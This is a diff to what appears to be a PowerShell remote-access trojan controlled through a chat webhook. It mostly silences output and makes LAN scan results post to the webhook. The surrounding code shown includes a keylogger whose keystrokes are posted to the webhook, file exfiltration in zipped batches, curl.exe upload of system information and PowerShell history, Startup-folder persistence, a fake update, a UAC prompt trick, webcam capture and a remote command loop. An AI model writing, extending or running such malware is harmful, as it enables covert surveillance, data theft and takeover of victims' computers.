@@ -102,7 +102,7 @@ This Eg. will scan 192.168.1.1 to 192.168.1.254         =
 =========================================================``"
 $escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
 }
 
 Function FolderTree{
@@ -120,7 +120,7 @@ Write-Output "Done."
 Function Message([string]$Message){
 msg.exe * $Message
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
 }
 
 Function Upload{
@@ -155,7 +155,7 @@ Start-Process -FilePath $pth
 sleep 3
 Remove-Item -Path $pth -Force
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
 }
 
 Function EnumerateLAN{
@@ -191,7 +191,8 @@ $data | ForEach-Object {
 }
 $data | Export-Csv $FileOut -NoTypeInformation
 $results = Get-Content -Path $FileOut -Raw
-Write-Output "$results"
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$results"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
 rm -Path $FileOut
 }
 
@@ -215,20 +216,20 @@ $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
 rm -path "$env:TEMP\temp.ps1" -Force
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Persistance Added!`` :white_check_mark:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
 }
 
 Function RemovePersistance{
 rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
 rm -Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Persistance Removed!`` :octagonal_sign:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
 }
 
 Function Exfiltrate {
 param ([string[]]$FileType,[string[]]$Path)
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":file_folder: ``Exfiltration Started..`` :file_folder:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
 $maxZipFileSize = 25MB
 $currentZipSize = 0
 $index = 1
@@ -352,11 +353,11 @@ $systemString``"
 ($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
 
 Sleep 1
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$infomessage"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
 
 curl.exe -F file1=@"$outpath" $hookurl
 Sleep 1
@@ -366,11 +367,11 @@ Remove-Item -Path $outpath -force
 Function IsAdmin{
 If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
     $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
     }
     else{
     $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``You are Admin!`` :white_check_mark:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
     }
 }
 
@@ -391,7 +392,7 @@ $tobat | Out-File -FilePath $pth -Force
 Sleep 7
 rm -Path $pth
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
 }
 
 Function TakePicture {
@@ -485,7 +486,7 @@ While ($true){
         $messages = Invoke-RestMethod -Uri $GHurl
         if ($messages -match "kill") {
         $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"} | ConvertTo-Json
-        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
         $previouscmd = $response
         return
         }
@@ -494,7 +495,7 @@ While ($true){
         If ($keyPressed -and $messages -notcontains "kill") {
             $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
             $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keys Captured :`` $escmsgsys"} | ConvertTo-Json
-            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
             $keyPressed = $false
             $nosave = ""
         }
@@ -513,7 +514,7 @@ while($true){
         if ($response -match "close") {
             $previouscmd = $response        
             $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Closing Session.`` :octagonal_sign:"} | ConvertTo-Json
-            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
             break
         }
         elseif (!($response -match "$previouscmd")) {
@@ -524,7 +525,7 @@ while($true){
             else{
                 $previouscmd = $response
                 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``$Result``"} | ConvertTo-Json
-                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys | Out-Null
             }
         }
     }
